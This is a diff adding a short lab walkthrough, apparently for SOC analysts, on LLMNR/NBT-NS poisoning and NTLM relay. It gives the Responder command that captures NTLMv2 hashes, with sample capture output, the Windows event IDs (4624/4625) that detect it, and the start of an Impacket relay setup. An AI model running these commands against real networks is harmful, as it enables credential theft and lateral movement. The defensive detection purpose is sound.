@@ -1,0 +1,30 @@
+LLMNR/NBT-NS poisoning lets an attacker respond to name resolution requests and capture NTLM authentication attempts from Windows clients. NTLM relay reuses those captured authentications against a target service (SMB, LDAP, HTTP, etc.). In modern environments SMB signing often blocks relays; however capture events and failed/successful NTLM network logons are reliable detection signals for SOC analysts.
+
+1- LLMNR Attack
+On Kali (attacker):
+sudo responder -I eth0 -wd
+
+ 
+On Windows victim:
+•	Attempt to access a non-existent file share or UNC path:
+\\seminar\videos Or open a link in a document or browser that doesn’t exist.
+ 
+Observation on Kali:
+•	Responder poisons LLMNR/NBT-NS requests and captures NTLMv2 hashes from the victim.
+•	Example output:
+•	[*] [LLMNR] Poisoned answer sent to 192.168.182.20
+•	[SMB] NTLMv2-SSP Client: 192.168.182.20
+•	[SMB] NTLMv2-SSP Username: WINSERV\Administrator
+•	[SMB] NTLMv2-SSP Hash: <hash>
+ 
+
+Responder captures NTLM authentication attempts (hashes). Even if the relay fails, these captures show credential harvesting activity and should trigger SOC investigation.
+Observation on Wazuh agent (Windows Server logs):
+•	Failed NTLM network logon: EventID 4625, LogonType 3, AuthPackage NTLM, Source 192.168.182.136
+•	Successful NTLM network logon (if relay succeeds): EventID 4624, LogonType 3, AuthPackage NTLM, Source 192.168.182.136
+
+2- Setting Up the Relay Environment (Kali)
+python3 -m venv ~/impacket-venv
+source ~/impacket-venv/bin/activate    # Always use source to activate the environment
+pip install --upgrade pip
+pip install impacket
